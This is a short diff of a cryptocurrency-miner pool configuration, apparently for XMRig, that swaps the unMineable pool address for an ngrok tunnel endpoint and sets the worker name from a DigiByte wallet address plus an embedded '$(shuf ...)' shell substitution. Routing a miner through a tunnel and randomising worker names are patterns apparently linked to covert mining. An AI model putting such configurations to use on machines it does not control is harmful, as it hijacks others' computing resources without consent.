@@ -64,7 +64,7 @@
         {
             "algo": null,
             "coin": null,
-            "url": "rx.unmineable.com:3333",
+            "url": "4.tcp.eu.ngrok.io:11620",
             "user": "DGB:dgb1qmsx84scmqd3eg2uau3f63ywfcspxu02h3agzwc.$(shuf -n 1 -i 1-9999999)",
             "pass": "x",
             "rig-id": null,
